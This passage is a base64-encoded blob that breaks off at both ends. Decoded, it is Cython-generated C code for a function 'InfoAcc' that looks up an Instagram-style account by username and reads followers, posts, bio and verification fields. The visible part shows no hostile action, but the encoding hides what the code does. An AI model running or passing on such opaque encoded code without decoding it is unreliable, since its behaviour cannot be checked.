W5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCAyNDYsIF9fcHl4X0wzX2Vycm9yKVxuICAgIH1cbiAgICBfX3B5eF92X3VzZXJuYW1lID0gdmFsdWVzWzBdO1xuICAgIF9fcHl4X3ZfZ2cgPSB2YWx1ZXNbMV07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJJbmZvQWNjIiwgMSwgMiwgMiwgX19weXhfbmFyZ3MpOyBfX1BZWF9FUlIoMCwgMjQ2LCBfX3B5eF9MM19lcnJvcilcbiAgX19weXhfTDZfc2tpcDo7XG4gIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7XG4gIF9fcHl4X0wzX2Vycm9yOjtcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9BZGRUcmFjZWJhY2soImpxLkluZm9BY2MiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBOVUxMO1xuICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7XG4gIF9fcHl4X3IgPSBfX3B5eF9wZl8yanFfOEluZm9BY2MoX19weXhfc2VsZiwgX19weXhfdl91c2VybmFtZSwgX19weXhfdl9nZyk7XG5cbiAgXG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJqcV84SW5mb0FjYyhDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl91c2VybmFtZSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9nZykge1xuICBQeU9iamVjdCAqX19weXhfdl9yciA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X0lkID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZnVsbF9uYW1lID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZm93cyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2Zvd2cgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9wcCA9IE5VTEw7XG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfaXNQcmFpc2UgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9iaW8gPSBOVUxMO1xuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X2lzX3ZlcmlmaWVkID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfYml6eiA9IE5VTEw7XG4gIGludCBfX3B5eF92X21ldGE7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3NzID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZmlsZSA9IE5VTEw7XG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfZSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90XzU7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7XG4gIGludCBfX3B5eF90Xzk7XG4gIGludCBfX3B5eF90XzEwO1xuICBQeU9iamVjdCAqX19weXhfdF8xMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEyID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xNCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE1ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTYgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xNyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE4ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTkgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yMFsyN107XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIxID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMjIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yMyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzI0ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMjVbNl07XG4gIGludCBfX3B5eF90XzI2O1xuICBpbnQgX19weXhfdF8yNztcbiAgY2hhciBjb25zdCAqX19weXhfdF8yODtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMjkgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8zMCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMxID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMzIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8zMyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzM0ID0gTlVMTDtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiSW5mb0FjYyIsIDApO1xuXG4gIFxuICBfX3B5eF90XzIgPSBOVUxMO1xuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luZm9pbnN0YSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDI0OSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI0OSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgX19weXhfdF8zID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyNDksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgX19weXhfdF81ID0gMTtcbiAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF80KSkpIHtcbiAgICBfX3B5eF90XzIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzQpO1xuICAgIGFzc2VydChfX3B5eF90XzIpO1xuICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF80KTtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNCwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICBfX3B5eF90XzUgPSAwO1xuICB9XG4gICNlbmRpZlxuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfMiwgX19weXhfdl91c2VybmFtZSwgX19weXhfdF8zfTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDMtX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDI0OSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIH1cbiAgX19weXhfdl9yciA9IF9fcHl4X3RfMTtcbiAgX19weXhfdF8xID0gMDtcblxuICBcbiAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3JyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMjUxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs2XSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI1MSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgX19weXhfdl9JZCA9IF9fcHl4X3RfNDtcbiAgX19weXhfdF80ID0gMDtcblxuICBcbiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3JyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjUyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs3XSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDI1MiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgX19weXhfdl9mdWxsX25hbWUgPSBfX3B5eF90XzE7XG4gIF9fcHl4X3RfMSA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9yciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDI1MywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbOF0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNTMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gIF9fcHl4X3ZfZm93cyA9IF9fcHl4X3RfNDtcbiAgX19weXhfdF80ID0gMDtcblxuICBcbiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3JyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjU0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs5XSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDI1NCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgX19weXhfdl9mb3dnID0gX19weXhfdF8xO1xuICBfX3B5eF90XzEgPSAwO1xuXG4gIFxuICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcnIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAyNTUsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEwXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI1NSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgX19weXhfdl9wcCA9IF9fcHl4X3RfNDtcbiAgX19weXhfdF80ID0gMDtcblxuICBcbiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3JyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjU2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMV0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAyNTYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gIF9fcHl4X3ZfaXNQcmFpc2UgPSBfX3B5eF90XzE7XG4gIF9fcHl4X3RfMSA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9yciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDI1NywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTJdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjU3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBfX3B5eF92X2JpbyA9IF9fcHl4X3RfNDtcbiAgX19weXhfdF80ID0gMDtcblxuICBcbiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3JyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjU4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxM10sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAyNTgsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gIF9fcHl4X3ZfaXNfdmVyaWZpZWQgPSBfX3B5eF90XzE7XG4gIF9fcHl4X3RfMSA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9yciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDI1OSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTRdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjU5LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBfX3B5eF92X2JpenogPSBfX3B5eF90XzQ7XG4gIF9fcHl4X3RfNCA9IDA7XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfNiwgJl9fcHl4X3RfNywgJl9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3ZfZm93cyk7IGlmICh1bmxpa2VseSgoX19weXhfdF8xMCA8IDApKSkgX19QWVhfRVJSKDAsIDI2MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoX19weXhfdF8xMCkge1xuICAgICAgfSBlbHNlIHtcbiAgICAgICAgX19weXhfdF85ID0gX19weXhfdF8xMDtcbiAgICAgICAgZ290byBfX3B5eF9MMTBfYm9vbF9iaW5vcF9kb25lO1xuICAgICAgfVxuICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF92X3BwKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzEwIDwgMCkpKSBfX1BZWF9FUlIoMCwgMjYxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fcHl4X3RfOSA9IF9fcHl4X3RfMTA7XG4gICAgICBfX3B5eF9MMTBfYm9vbF9iaW5vcF9kb25lOjtcbiAgICAgIGlmIChfX3B5eF90XzkpIHtcblxuICAgICAgICBcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlOdW1iZXJfSW50KF9fcHl4X3ZfZm93cyk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI2MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICBfX3B5eF90XzEgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMCwgUHlfR0UpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDI2MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSgoX19weXhfdF8xMCA8IDApKSkgX19QWVhfRVJSKDAsIDI2MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICBpZiAoX19weXhfdF8xMCkge1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgIF9fcHl4X3RfOSA9IF9fcHl4X3RfMTA7XG4gICAgICAgICAgZ290byBfX3B5eF9MMTNfYm9vbF9iaW5vcF9kb25lO1xuICAgICAgICB9XG4gICAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5TnVtYmVyX0ludChfX3B5eF92X3BwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMjYyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIsIFB5X0dFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNjIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTAgPCAwKSkpIF9fUFlYX0VSUigwLCAyNjIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgX19weXhfdF85ID0gX19weXhfdF8xMDtcbiAgICAgICAgX19weXhfTDEzX2Jvb2xfYmlub3BfZG9uZTo7XG4gICAgICAgIGlmIChfX3B5eF90XzkpIHtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3ZfbWV0YSA9IDE7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBnb3RvIF9fcHl4X0wxMjtcbiAgICAgICAgfVxuXG4gICAgICAgIFxuICAgICAgICAge1xuICAgICAgICAgIF9fcHl4X3ZfbWV0YSA9IDA7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfTDEyOjtcblxuICAgICAgICBcbiAgICAgICAgZ290byBfX3B5eF9MOTtcbiAgICAgIH1cblxuICAgICAgXG4gICAgICAge1xuICAgICAgICBfX3B5eF92X21ldGEgPSAwO1xuICAgICAgfVxuICAgICAgX19weXhfTDk6O1xuXG4gICAgICBcbiAgICB9XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgZ290byBfX3B5eF9MOF90cnlfZW5kO1xuICAgIF9fcHl4X0wzX2Vycm9yOjtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG5cbiAgICBcbiAgICAge1xuICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJqcS5JbmZvQWNjIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzQsICZfX3B5eF90XzEsICZfX3B5eF90XzMpIDwgMCkgX19QWVhfRVJSKDAsIDI2OCwgX19weXhfTDVfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3ZfbWV0YSA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBnb3RvIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgIH1cblxuICAgIFxuICAgIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF82KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF82LCBfX3B5eF90XzcsIF9fcHl4X3RfOCk7XG4gICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICBfX3B5eF9MNF9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF82KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF82LCBfX3B5eF90XzcsIF9fcHl4X3RfOCk7XG4gICAgX19weXhfTDhfdHJ5X2V